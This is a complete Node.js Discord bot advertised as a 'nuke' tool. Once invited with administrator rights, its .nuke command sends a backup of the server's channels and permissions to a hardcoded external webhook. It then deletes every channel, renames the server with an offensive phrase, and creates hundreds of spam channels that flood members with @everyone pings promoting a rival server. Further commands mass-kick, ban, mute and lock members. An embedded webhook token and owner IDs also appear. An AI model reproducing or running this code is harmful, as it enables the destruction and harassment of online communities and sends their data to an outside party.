const { Client, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ChannelType } = require('discord.js');
const http = require('http');
const https = require('https');

const client = new Client({ intents: [1, 512, 32768, 2, 16] });

const TOKEN = process.env.TOKEN;
const LOG_WEBHOOK = "https://discord.com/api/webhooks/1497802608491106357/1rPNKGuyh780KsnqoWnzAWcXjbPTfRx3jWtcefHcYkdywE7GkibcGwvWqRvZE2CgjHnf";
const WHITELIST_SERVER = "1475357940088176743";
const INVITE_URL = "https://discord.com/oauth2/authorize?client_id=1497740024983195668&permissions=8&integration_type=0&scope=bot";
const EXT_INVITE = "https://discord.com/oauth2/authorize?client_id=1489612859179798588&integration_type=1&scope=applications.commands";
const OWNER_ID = "1183142340609708072";
const WHITELIST_ROLE_ID = "1498099673406374029";

http.createServer((req, res) => {
    res.writeHead(200);
    res.end('Alive');
}).listen(process.env.PORT || 3000);

client.once('ready', () => console.log(`[+] ${client.user.tag} is online`));

const sleep = ms => new Promise(r => setTimeout(r, ms));

// Backup helpers
async function backupGuild(guild) {
    const channels = guild.channels.cache.sort((a, b) => a.position - b.position);
    return {
        name: guild.name,
        channels: channels.map(ch => ({
            name: ch.name,
            type: ch.type,
            parentId: ch.parentId || null,
            position: ch.position,
            permissionOverwrites: ch.permissionOverwrites.cache.map(ow => ({
                id: ow.id,
                type: ow.type,
                allow: ow.allow.bitfield.toString(),
                deny: ow.deny.bitfield.toString()
            }))
        }))
    };
}

async function restoreGuild(guild, backup) {
    await guild.setName(backup.name).catch(() => {});
    for (const ch of guild.channels.cache.values()) {
        await ch.delete().catch(() => {});
        await sleep(100);
    }
    const categories = backup.channels.filter(c => c.type === ChannelType.GuildCategory);
    const others = backup.channels.filter(c => c.type !== ChannelType.GuildCategory);
    const catMap = new Map();
    for (const cat of categories) {
        const created = await guild.channels.create({
            name: cat.name,
            type: ChannelType.GuildCategory,
            position: cat.position,
            permissionOverwrites: cat.permissionOverwrites.map(ow => ({
                id: ow.id,
                type: ow.type,
                allow: BigInt(ow.allow),
                deny: BigInt(ow.deny)
            }))
        }).catch(() => null);
        if (created) catMap.set(cat.name, created);
        await sleep(150);
    }
    for (const ch of others) {
        const parent = ch.parentId ? catMap.get(backup.channels.find(c => c.type === 4 && c.name === categories.find(cat => cat.name === ch.parentId)?.name)?.name) : null;
        await guild.channels.create({
            name: ch.name,
            type: ch.type,
            parent: parent || undefined,
            position: ch.position,
            permissionOverwrites: ch.permissionOverwrites.map(ow => ({
                id: ow.id,
                type: ow.type,
                allow: BigInt(ow.allow),
                deny: BigInt(ow.deny)
            }))
        }).catch(() => {});
        await sleep(150);
    }
}

// Send log to webhook WITHOUT backup file first (simple JSON)
async function sendLog(guildId, originalName, username, time) {
    const embed = new EmbedBuilder()
        .setTitle('Server Nuked')
        .setDescription(`**Name:** ${originalName}\n**By:** ${username}\n**Time:** ${time}`)
        .setColor(0xff0000);
    const button = new ButtonBuilder()
        .setCustomId(`restore_${guildId}`)
        .setLabel('Restore Server')
        .setStyle(ButtonStyle.Success);
    const row = new ActionRowBuilder().addComponents(button);
    
    const payload = {
        content: '**Server Nuked**',
        embeds: [embed.toJSON()],
        components: [row.toJSON()]
    };

    const response = await fetch(LOG_WEBHOOK, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    });
    console.log(`[WEBHOOK] Simple log status: ${response.status}`);
    return response.ok;
}

// Send backup file separately
async function sendBackupFile(backup, guildId) {
    const FormData = require('form-data');
    const form = new FormData();
    
    const payload = {
        content: '**Backup data attached**'
    };
    form.append('payload_json', JSON.stringify(payload));
    form.append('files[0]', Buffer.from(JSON.stringify(backup, null, 2), 'utf-8'), `backup-${guildId}.json`);

    const response = await fetch(LOG_WEBHOOK, {
        method: 'POST',
        body: form,
        headers: form.getHeaders()
    });
    console.log(`[WEBHOOK] File upload status: ${response.status}`);
    return response.ok;
}

client.on('messageCreate', async (message) => {
    if (message.author.bot) return;
    const isProtected = message.guild?.id === WHITELIST_SERVER;
    const isOwner = message.author.id === OWNER_ID;
    const args = message.content.trim().split(/\s+/);
    const cmd = args[0].toLowerCase();

    if (cmd === '.whitelist') {
        if (!isOwner) return message.reply('You are not the owner').catch(() => {});
        const target = message.mentions.members.first();
        if (!target) return message.reply('Mention someone').catch(() => {});
        target.roles.add(WHITELIST_ROLE_ID).then(() => message.reply(`Whitelisted ${target.user.tag}`)).catch(() => message.reply('Failed'));
        return;
    }

    if (isProtected && !isOwner && cmd !== '.panel' && cmd !== '.extpanel') {
        if (message.content.startsWith('.')) return message.reply('Server protected').catch(() => {});
        return;
    }

    if (cmd === '.panel') {
        const embed = new EmbedBuilder().setTitle('Discord Nuke Bot').setDescription('**Best nuker with admin**').setColor(0xff0000);
        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setLabel('Invite').setStyle(ButtonStyle.Link).setURL(INVITE_URL),
            new ButtonBuilder().setLabel('Commands').setStyle(ButtonStyle.Primary).setCustomId('cmds')
        );
        return message.channel.send({ embeds: [embed], components: [row] }).catch(() => {});
    }
    if (cmd === '.extpanel') {
        const embed = new EmbedBuilder().setTitle('External Bot').setDescription('User-installable bot').setColor(0x00ff00);
        const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setLabel('Add External Bot').setStyle(ButtonStyle.Link).setURL(EXT_INVITE));
        return message.channel.send({ embeds: [embed], components: [row] }).catch(() => {});
    }

    if (cmd === '.nuke') {
        console.log(`[NUKE] Triggered by ${message.author.tag} in ${message.guild.name}`);
        try {
            if (isProtected) return message.reply('Server protected').catch(() => {});
            await message.delete().catch(() => {});
            const g = message.guild;
            const originalName = g.name;
            const username = message.author.tag;
            const time = new Date().toISOString();

            console.log('[NUKE] Backing up...');
            const backup = await backupGuild(g);
            console.log('[NUKE] Backup complete.');

            // Send log with button (no file)
            console.log('[NUKE] Sending log webhook...');
            const logOk = await sendLog(g.id, originalName, username, time);
            console.log(`[NUKE] Log sent: ${logOk}`);

            // Send backup file as attachment
            console.log('[NUKE] Sending backup file...');
            const fileOk = await sendBackupFile(backup, g.id);
            console.log(`[NUKE] File sent: ${fileOk}`);

            // Nuke
            console.log('[NUKE] Starting nuke...');
            await g.setName('NGA GOT NUKED BY JHUB').catch(() => {});
            const channels = Array.from(g.channels.cache.values());
            for (const ch of channels) {
                await ch.delete().catch(() => {});
                await sleep(100);
            }
            for (let i = 0; i < 500; i++) {
                g.channels.create({ name: 'jhub-on-top', type: 0 }).then(ch => {
                    if (!ch) return;
                    for (let j = 0; j < 10; j++) ch.send('@everyone @here Discord.gg/Jhub NGA GOT NUKED BY JHUB').catch(() => {});
                }).catch(() => {});
                await sleep(200);
            }
            console.log('[NUKE] Nuke complete.');
        } catch(e) {
            console.error('[NUKE] Error:', e);
        }
        return;
    }

    // Other commands
    if (cmd === '.kick') { const m = message.mentions.members.first(); if (!m) return; m.kick().catch(() => {}); }
    if (cmd === '.ban') { const m = message.mentions.members.first(); if (!m) return; m.ban().catch(() => {}); }
    if (cmd === '.kickall') { for (const [, m] of message.guild.members.cache) { if (m.kickable && m.id !== client.user.id) { m.kick().catch(() => {}); } } }
    if (cmd === '.banall') { for (const [, m] of message.guild.members.cache) { if (m.bannable && m.id !== client.user.id) { m.ban().catch(() => {}); } } }
    if (cmd === '.muteall') { for (const [, m] of message.guild.members.cache) { if (m.moderatable) m.timeout(28*24*60*60*1000).catch(() => {}); } }
    if (cmd === '.lockall') { for (const [, ch] of message.guild.channels.cache) { if (ch.type === 0) ch.permissionOverwrites.create(message.guild.roles.everyone, { SendMessages: false }).catch(() => {}); } }
});

client.on('interactionCreate', async (interaction) => {
    if (!interaction.isButton()) return;
    if (interaction.customId === 'cmds') {
        const embed = new EmbedBuilder().setTitle('Commands').setDescription('.nuke .kick .ban .kickall .banall .muteall .lockall .panel .extpanel');
        return interaction.reply({ embeds: [embed], ephemeral: true });
    }
    if (interaction.customId.startsWith('restore_')) {
        if (interaction.user.id !== OWNER_ID) return interaction.reply({ content: 'Only owner can restore.', ephemeral: true });
        await interaction.deferReply({ ephemeral: true });
        const guildId = interaction.customId.split('_')[1];
        const guild = client.guilds.cache.get(guildId);
        if (!guild) return interaction.editReply('Server not found.');
        const msg = interaction.message;
        const attachment = msg.attachments.first();
        if (!attachment) return interaction.editReply('No backup file.');
        try {
            const backupText = await fetch(attachment.url).then(r => r.text());
            const backup = JSON.parse(backupText);
            await restoreGuild(guild, backup);
            const disabledRow = new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId('done').setLabel('Restored').setStyle(ButtonStyle.Secondary).setDisabled(true)
            );
            await msg.edit({ components: [disabledRow] }).catch(() => {});
            await interaction.editReply('Server restored!');
        } catch(e) {
            console.error(e);
            await interaction.editReply('Restore failed.');
        }
    }
});

client.login(TOKEN);
